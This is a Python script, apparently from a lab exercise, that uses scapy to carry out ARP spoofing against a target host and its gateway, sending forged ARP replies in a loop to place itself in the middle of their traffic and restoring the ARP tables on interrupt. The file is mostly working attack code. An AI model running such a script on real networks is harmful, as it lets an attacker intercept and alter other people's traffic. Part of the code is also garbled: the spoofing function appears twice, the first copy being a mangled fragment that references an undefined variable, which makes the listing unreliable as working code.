import scapy.all as scapy
import time
import sys

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)  # Sends ARP request
    # scapy.ls(scapy.ARP)
    # print(arp_request.summary())
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    # print(broadcast.summary())
    arp_request_broadcast = broadcast / arp_request
    # arp_request_broadcast.show()
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    #print(packet.show())
    #print(packet.summary())
    scapy.send(packet, verbose = False)

def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op = 2, pdst=dest_ip, hwdst=dest_mac,psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count= 4, verbose=False)

target_ip = "10.0.2.6"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip )
        sent_packets_count = sent_packets_count + 2
        print("\r Packets sent:"+ str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("Detected Keyboard Interrupt by the user...Resetting ARP Tables")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)